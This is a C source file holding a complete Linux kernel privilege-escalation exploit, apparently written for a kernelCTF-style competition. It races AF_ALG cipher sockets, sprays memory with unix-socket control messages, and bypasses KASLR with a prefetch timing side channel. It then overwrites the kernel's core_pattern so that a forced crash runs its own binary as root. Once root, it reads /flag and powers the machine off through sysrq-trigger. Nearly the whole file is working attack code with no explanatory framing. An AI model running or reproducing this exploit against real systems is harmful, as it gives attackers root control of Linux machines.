#define _GNU_SOURCE
#include <sched.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <stdint.h>
#include <unistd.h>
#include <string.h>
#include <stdio.h>
#include <errno.h>
#include <fcntl.h>
#include <stdlib.h>
#include <sys/resource.h>
#include <sys/uio.h>
#include <sys/mman.h>
#include <pthread.h>
#include <err.h>
#include <sys/sendfile.h>
#ifndef SYS_pidfd_getfd
#define SYS_pidfd_getfd 438
#endif

#ifndef SYS_pidfd_open
#define SYS_pidfd_open 434
#endif

size_t vmemmap_base = 0xffffea0000000000ULL;
size_t page_offset_base = 0xffff888000000000ULL;
size_t core_pattern = 0xffffffff8420d520ULL;

/* Socket options */
#define ALG_SET_KEY 1
#define ALG_SET_IV 2
#define ALG_SET_OP 3
#define ALG_SET_AEAD_ASSOCLEN 4
#define ALG_SET_AEAD_AUTHSIZE 5
#define ALG_SET_DRBG_ENTROPY 6
#define ALG_SET_KEY_BY_KEY_SERIAL 7

/* Operations */
#define ALG_OP_DECRYPT 0
#define ALG_OP_ENCRYPT 1

typedef unsigned char u8;
typedef unsigned short u16;
typedef unsigned int u32;
typedef unsigned long long u64;
typedef char i8;
typedef short i16;
typedef int i32;
typedef long long i64;
#define ARRAY_LEN(x) (sizeof(x) / sizeof(x[0]))

#define __u32 uint32_t
#define __u16 uint16_t
#define __u8 uint8_t
#define PAUSE           \
	{                   \
		int x;          \
		printf(":");    \
		read(0, &x, 1); \
	}

#define SYSCHK(x) ({              \
	typeof(x) __res = (x);        \
	if (__res == (typeof(x))-1)   \
		err(1, "SYSCHK(" #x ")"); \
	__res;                        \
})

#ifndef SYS_process_vm_readv
#define SYS_process_vm_readv 310
#endif

pthread_t tid[0x100];
pthread_t tid2[0x100];

char buf[0x10000];
char vec[0x100000];

int cfd[2];
int sfd[0x200][2];
int sfd2[0x200][2];
char payload[0x1000];
int opfd;

#define LEN 0x1000 / 8 * 0x1000

const int THREAD_NUM = 0x100;

struct sockaddr_alg
{
	__u16 salg_family;
	__u8 salg_type[14];
	__u32 salg_feat;
	__u32 salg_mask;
	__u8 salg_name[64];
};

void set_cpu(int i)
{
	cpu_set_t mask;
	CPU_ZERO(&mask);
	CPU_SET(i, &mask);
	sched_setaffinity(0, sizeof(mask), &mask);
}

void *job(void *x)
{
	size_t idx = (size_t)x;
	write(cfd[0], buf, 1);
	read(cfd[0], buf, 1);
	struct iovec iov = {buf, 0x1000};
	struct msghdr mhdr = {
		.msg_iov = &iov,
		.msg_iovlen = 1,
		.msg_control = payload,
		.msg_controllen = 0x1000};
	while (1)
	{
		sendmsg(sfd[idx][1], &mhdr, 0);
		write(cfd[0], buf, 1);
		read(cfd[0], buf, 1);
	}
}

void do_spray()
{
	memset(payload, 'a', 0x1000);
	struct cmsghdr *first;
	first = (struct cmsghdr *)payload;
	first->cmsg_len = 0x1000;
	first->cmsg_level = 0; // must be different than SOL_SOCKET=1 to "skip" cmsg
	first->cmsg_type = 0x41414141;
	*(size_t *)&payload[0xff8] = 0; //((0ULL - page_offset_base) >> 6) + vmemmap_base;

	for (int i = 0; i < THREAD_NUM; i++)
	{
		SYSCHK(socketpair(AF_UNIX, SOCK_DGRAM, 0, sfd[i]));
		int n = 0x800;
		setsockopt(sfd[i][1], SOL_SOCKET, SO_SNDBUF, (char *)&n, sizeof(n));
		setsockopt(sfd[i][0], SOL_SOCKET, SO_RCVBUF, (char *)&n, sizeof(n));
		write(sfd[i][1], buf, 0x1000);
	}

	for (int i = 0; i < THREAD_NUM; i++)
		pthread_create(&tid[i], 0, job, (void *)(size_t)i);

	for (int i = 0; i < THREAD_NUM; i++)
		read(cfd[1], buf, 1);
}

void allocate_map()
{

	char *start = (void *)0x100000000ULL;
	while (1)
	{
		start = SYSCHK(mmap(start, 0x80000000ULL, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANON | MAP_FIXED, -1, 0));
		// printf("%p\n",start);
		start += 0x80000000ULL;
		if ((size_t)start >= 0x500000000000ULL)
			break;
	}
}

size_t search_offset(char *start)
{

	char *pvec;
	while (1)
	{
		//printf("\r%016zx", (size_t)start);
		mincore((void *)start, 0x100000000ULL, vec);
		pvec = memchr(vec, 1, 0x100000);
		if (pvec)
		{
			char *leak_offset = start + (pvec - vec) * 0x1000;

			pvec = memchr((void *)leak_offset, 'a', 0x1000);
			if (pvec)
				break;
		}

		start += 0x100000000ULL;
	}

	printf("\npvec %p %x\n", pvec, pvec[0]);
	return (size_t)pvec;
}

int check_core()
{
	// Check if /proc/sys/kernel/core_pattern has been overwritten
	char buf[0x100] = {};
	int core = open("/proc/sys/kernel/core_pattern", O_RDONLY);
	read(core, buf, sizeof(buf));
	close(core);
	return strncmp(buf, "|/proc/%P/fd/666", 0x10) == 0;
}
void crash(char *cmd)
{
	int memfd = memfd_create("", 0);
	// send our binary to memfd for core_pattern payload
	SYSCHK(sendfile(memfd, open("/proc/self/exe", 0), 0, 0xffffffff));
	// our binary now at file descriptor 666
	dup2(memfd, 666);
	close(memfd);
	while (check_core() == 0)
		sleep(1);
	puts("Root shell !!");
	/* Trigger program crash and cause kernel to executes program from core_pattern which is our "root" binary */
	*(size_t *)0 = 0;
}

size_t bypass_kaslr(u64 base);
size_t bypass_kaslr2(u64 base)
{
	FILE *fp = popen("sudo cat /proc/kallsyms |grep _stext|cut -d ' ' -f 1", "r");
	fread(buf, 1, 0x100, fp);
	size_t ret = strtoull(buf, 0, 16);
	memset(buf, 0, 0x100);
	return ret;
}

int guess_addr(size_t guesss)
{

	for (int i = 0; i < THREAD_NUM; i++)
	{
		read(sfd[i][0], buf, 0x1000);
		read(cfd[1], buf, 1);
	}
	*(size_t *)&payload[0xff8] = guesss;
	write(cfd[1], buf, 0x100);
	buf[0] = 'b';
	int x = send(opfd, buf, 1, MSG_MORE);
	printf("x: %d\n", x);
	return x == 1;
}
int main2();
int main(int argc, char **argv)
{

	setvbuf(stdin, 0, 2, 0);
	setvbuf(stdout, 0, 2, 0);

	if (argc == 1)
	{

		size_t stext = bypass_kaslr(0);
		core_pattern = 0xffffffff83db3720;


		core_pattern = stext + (core_pattern - 0xffffffff81000000UL);
		printf("got stext 0x%zx 0x%zx 0x%zx\n", stext, core_pattern, stext + 0x90b1ae);
	}

	struct rlimit rlim = {
		.rlim_cur = 0xf000,
		.rlim_max = 0xf000};
	setrlimit(RLIMIT_NOFILE, &rlim);

	if (argc > 1)
	{
#define SYS_pidfd_getfd 438
		int pid = strtoull(argv[1], 0, 10);
		int pfd = syscall(SYS_pidfd_open, pid, 0);
		int stdinfd = syscall(SYS_pidfd_getfd, pfd, 0, 0);
		int stdoutfd = syscall(SYS_pidfd_getfd, pfd, 1, 0);
		int stderrfd = syscall(SYS_pidfd_getfd, pfd, 2, 0);
		dup2(stdinfd, 0);
		dup2(stdoutfd, 1);
		dup2(stderrfd, 2);
		/* Get flag and poweroff immediately to boost next round try in PR verification workflow*/
		system("cat /flag");
		system("cat /flag");
		system("cat /flag");
		system("cat /flag");
		system("cat /flag");
		system("cat /flag");

		system("cat /flag;echo o>/proc/sysrq-trigger");
		execlp("bash", "bash", NULL);
	}
	if (fork() == 0) // this process is used to trigger core_pattern exploit
	{
		set_cpu(0);
		setsid();
		crash("");
	}
	while (1)
	{
		if (fork() == 0)
		{
			main2();
			exit(0);
		}
		wait(NULL);
	}
}
int main2()
{
	int tfmfd;

	set_cpu(1);
	SYSCHK(socketpair(AF_UNIX, SOCK_STREAM, 0, cfd));

	do_spray();

	char *addr = SYSCHK(mmap(0, LEN, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0));
	struct iovec local = {.iov_base = addr, .iov_len = LEN};
	struct iovec remote = {.iov_base = addr, .iov_len = LEN};

	struct sockaddr_alg sa = {
		.salg_family = AF_ALG,
		.salg_type = "skcipher", // symmetric key cipher
		.salg_name = "cbc(aes)", // AES in CBC mode
	};

	// Create transformation socket
	tfmfd = socket(AF_ALG, SOCK_SEQPACKET, 0);
	if (tfmfd == -1)
	{
		perror("socket");
		return 1;
	}

	// Bind to algorithm
	if (bind(tfmfd, (struct sockaddr *)&sa, sizeof(sa)) != 0)
	{
		perror("bind");
		close(tfmfd);
		return 1;
	}

	// Set the key for AES (256-bit key example)
	unsigned char key[32] = {0};
	if (setsockopt(tfmfd, SOL_ALG, ALG_SET_KEY, key, sizeof(key)) != 0)
	{
		perror("setsockopt");
		close(tfmfd);
		return 1;
	}

	// Accept operation socket
	opfd = accept(tfmfd, NULL, 0);
	if (opfd == -1)
	{
		perror("accept");
		close(tfmfd);
		return 1;
	}

	int val = 0x1000;

	// Prepare message header for encryption
	struct
	{
		struct cmsghdr cmsg;
		__u32 op; // operation: encrypt or decrypt
		__u32 ivlen;
		unsigned char iv[16];
	} __attribute__((__packed__)) msg;

	memset(&msg, 0, sizeof(msg));
	msg.cmsg.cmsg_level = SOL_ALG;
	msg.cmsg.cmsg_type = ALG_SET_OP;
	msg.cmsg.cmsg_len = CMSG_LEN(sizeof(__u32) + sizeof(__u32) + 16);

	msg.op = ALG_OP_ENCRYPT;
	msg.ivlen = 16;
	memset(msg.iv, 0x01, 16); // example IV

	// Plaintext input
	unsigned char plaintext[16] = "Hello, AF_ALG!!!";
	unsigned char ciphertext[16];

	struct iovec iov = {
		.iov_base = buf,
		.iov_len = 0x1000,
	};

	struct msghdr msgh;
	memset(&msgh, 0, sizeof(msgh));
	msgh.msg_iov = &iov;
	msgh.msg_iovlen = 1;
	msgh.msg_control = &msg;
	msgh.msg_controllen = msg.cmsg.cmsg_len;

	// Encrypt
	ssize_t n = sendmsg(opfd, &msgh, MSG_MORE); // init
	printf("init %ld\n", n);
	// PAUSE;

	for (int i = 0; i < 0x7b; i++)
	{
		SYSCHK(send(opfd, buf, 0x1000, MSG_MORE));
		n = recv(opfd, buf, 0x1000, 0);
	}

	// PAUSE;
	send(opfd, buf, 0x1000, MSG_MORE);
	SYSCHK(setsockopt(opfd, SOL_SOCKET, SO_SNDBUF, &val, sizeof(val)));
	printf("setsockopt done\n");

	if (fork() == 0)
	{

		int x = send(opfd, (void *)0xfff000, 0x400, MSG_MORE);

		for (int i = 0; i < 0x80; i++)
		{
			SYSCHK(syscall(SYS_process_vm_readv, getpid(), &local, 1, &remote, 1, 0));
			write(cfd[1], buf, 1);
		}

		printf("send3 %d\n", x);
		exit(0);
	}

	if (fork() == 0)
	{

		int x = send(opfd, buf, 0x200, MSG_MORE);

		printf("send2 %d\n", x);
		exit(0);
	}

	// PAUSE;

	sleep(1);
	n = recv(opfd, buf, 0x1000, 0);
	printf("recv2 %ld\n", n);
	wait(NULL);

	printf("wait done\n");
	for (int i = 0; i < 0x80; i++)
	{
		SYSCHK(syscall(SYS_process_vm_readv, getpid(), &local, 1, &remote, 1, 0));
		write(cfd[1], buf, 1);
	}

	n = recv(opfd, buf, 0x1000, 0);

	printf("recv2 %ld\n", n);

	memset(buf, 'z', 0x1000);

	allocate_map();

	int x = send(opfd, buf, 1, MSG_MORE);

	if (x == 1)
	{
		puts("Race fail");
		exit(0);
	}
	size_t oracle;
	size_t leak_offset = 0;
	int xcnt = 0;
	while (1)
	{

		for (int i = 0; i < THREAD_NUM; i++)
		{
			read(sfd[i][0], buf, 0x1000);
			read(cfd[1], buf, 1);
		}
		*(size_t *)&payload[0xff8] -= (0x500000000000ULL >> 6);
		write(cfd[1], buf, 0x100);
		buf[0] = 'a';
		x = send(opfd, buf, 1, MSG_MORE);

		if (x == 1)
		{
			xcnt++;
			oracle = *(size_t *)&payload[0xff8];
			char *start = (void *)(0ULL);
			// test guess is first/second half
			for (int j = 0; j < 8; j++)
			{
				x = guess_addr(oracle - (0x500000000000ULL >> (7 + j)));
				if (x == 1)
				{
					xcnt++;
					start += (0x500000000000ULL >> (1 + j)); // second half
					munmap(start - (0x500000000000ULL >> (1 + j)), (0x500000000000ULL >> (1 + j)));
				}
				else
				{
					munmap(start + (0x500000000000ULL >> (1 + j)), (0x500000000000ULL >> (1 + j)));
				}
			}
			*(size_t *)&payload[0xff8] = oracle;
			leak_offset = search_offset(start) + xcnt;
			printf("leak_offset %zx\n", leak_offset);
			printf("%zx\n", *(size_t *)&payload[0xff8]);

			break;
		}
	}

	for (int i = 0; i < THREAD_NUM; i++)
	{
		read(sfd[i][0], buf, 0x1000);
		read(cfd[1], buf, 1);
	}
	*(size_t *)&payload[0xff8] = oracle;
	write(cfd[1], buf, 0x100);

	size_t adjust_offset = 0x1000 + (core_pattern & 0xfff) - (leak_offset & 0xfff);
	leak_offset += adjust_offset;

	SYSCHK(send(opfd, buf, adjust_offset, MSG_MORE));

	for (int i = 0; i < THREAD_NUM; i++)
	{
		read(sfd[i][0], buf, 0x1000);
		read(cfd[1], buf, 1);
	}

	*(size_t *)&payload[0xff8] += (((core_pattern & ~0xfff) - (leak_offset & ~0xfff)) >> 6);
	//if (getenv("MIT"))
	*(size_t *)&payload[0xff8] += (0x100000000ULL >> 6);
	printf("%zx\n", *(size_t *)&payload[0xff8]);
	write(cfd[1], buf, 0x100);
	char mcore[64] = "|/proc/%P/fd/666 %P";
	SYSCHK(send(opfd, mcore, 64, MSG_MORE));
	PAUSE;

	return 0;
}

inline __attribute__((always_inline)) uint64_t rdtsc_begin()
{
	uint64_t a, d;
	asm volatile("mfence\n\t"
				 "RDTSCP\n\t"
				 "mov %%rdx, %0\n\t"
				 "mov %%rax, %1\n\t"
				 "xor %%rax, %%rax\n\t"
				 "lfence\n\t"
				 : "=r"(d), "=r"(a)
				 :
				 : "%rax", "%rbx", "%rcx", "%rdx");
	a = (d << 32) | a;
	return a;
}

inline __attribute__((always_inline)) uint64_t rdtsc_end()
{
	uint64_t a, d;
	asm volatile(
		"xor %%rax, %%rax\n\t"
		"lfence\n\t"
		"RDTSCP\n\t"
		"mov %%rdx, %0\n\t"
		"mov %%rax, %1\n\t"
		"mfence\n\t"
		: "=r"(d), "=r"(a)
		:
		: "%rax", "%rbx", "%rcx", "%rdx");
	a = (d << 32) | a;
	return a;
}

void prefetch(void *p)
{
	asm volatile(
		"prefetchnta (%0)\n"
		"prefetcht2 (%0)\n"
		: : "r"(p));
}

size_t flushandreload(void *addr) // row miss
{
	size_t time = rdtsc_begin();
	prefetch(addr);
	size_t delta = rdtsc_end() - time;
	return delta;
}

// #define KASLR_BYPASS_INTEL
size_t bypass_kaslr(u64 base)
{
	if (!base)
	{
#ifdef KASLR_BYPASS_INTEL
#define OFFSET 0
#define START (0xffffffff81000000ull + OFFSET)
#define END (0xffffffffD0000000ull + OFFSET)
#define STEP 0x0000000002000000ull
		while (1)
		{
			u64 bases[7] = {0};
			for (int vote = 0; vote < ARRAY_LEN(bases); vote++)
			{
				size_t times[(END - START) / STEP] = {};
				uint64_t addrs[(END - START) / STEP];

				for (int ti = 0; ti < ARRAY_LEN(times); ti++)
				{
					times[ti] = ~0;
					addrs[ti] = START + STEP * (u64)ti;
				}

				for (int i = 0; i < 16; i++)
				{
					for (int ti = 0; ti < ARRAY_LEN(times); ti++)
					{
						u64 addr = addrs[ti];
						size_t t = flushandreload((void *)addr);
						if (t < times[ti])
						{
							times[ti] = t;
						}
					}
				}

				size_t minv = ~0;
				size_t mini = -1;
				for (int ti = 0; ti < ARRAY_LEN(times) - 1; ti++)
				{
					if (times[ti] < minv)
					{
						mini = ti;
						minv = times[ti];
					}
				}

				if (mini < 0)
				{
					return -1;
				}

				bases[vote] = addrs[mini];
			}

			int c = 0;
			for (int i = 0; i < ARRAY_LEN(bases); i++)
			{
				if (c == 0)
				{
					base = bases[i];
				}
				else if (base == bases[i])
				{
					c++;
				}
				else
				{
					c--;
				}
			}

			c = 0;
			for (int i = 0; i < ARRAY_LEN(bases); i++)
			{
				if (base == bases[i])
				{
					c++;
				}
			}
			if (c > ARRAY_LEN(bases) / 2)
			{
				base -= OFFSET;
				goto got_base;
			}

			printf("majority vote failed:\n");
			printf("base = %llx with %d votes\n", base, c);
		}
#else
#define START (0xffffffff81000000ull)
#define END (0xffffffffc0000000ull)
#define STEP 0x0000000000100000ull
#define NUM_TRIALS 9
// largest contiguous mapped area at the beginning of _stext
#define WINDOW_SIZE 11

		while (1)
		{
			u64 bases[NUM_TRIALS] = {0};

			for (int vote = 0; vote < ARRAY_LEN(bases); vote++)
			{
				size_t times[(END - START) / STEP] = {};
				uint64_t addrs[(END - START) / STEP];

				for (int ti = 0; ti < ARRAY_LEN(times); ti++)
				{
					times[ti] = ~0;
					addrs[ti] = START + STEP * (u64)ti;
				}

				for (int i = 0; i < 16; i++)
				{
					for (int ti = 0; ti < ARRAY_LEN(times); ti++)
					{
						u64 addr = addrs[ti];
						size_t t = flushandreload((void *)addr);
						if (t < times[ti])
						{
							times[ti] = t;
						}
					}
				}

				uint64_t max = 0;
				int max_i = 0;
				for (int ti = 0; ti < ARRAY_LEN(times) - WINDOW_SIZE; ti++)
				{
					uint64_t sum = 0;
					for (int i = 0; i < WINDOW_SIZE; i++)
					{
						sum += times[ti + i];
					}
					if (sum > max)
					{
						max = sum;
						max_i = ti;
					}
				}

				bases[vote] = addrs[max_i];
			}

			int c = 0;
			for (int i = 0; i < ARRAY_LEN(bases); i++)
			{
				if (c == 0)
				{
					base = bases[i];
				}
				else if (base == bases[i])
				{
					c++;
				}
				else
				{
					c--;
				}
			}

			c = 0;
			for (int i = 0; i < ARRAY_LEN(bases); i++)
			{
				if (base == bases[i])
				{
					c++;
				}
			}
			if (c > ARRAY_LEN(bases) / 2)
			{
				goto got_base;
			}

			printf("majority vote failed:\n");
			printf("base = %llx with %d votes\n", base, c);
		}
#endif
	}

got_base:

	printf("using kernel base %llx\n", base);

	return base;
}
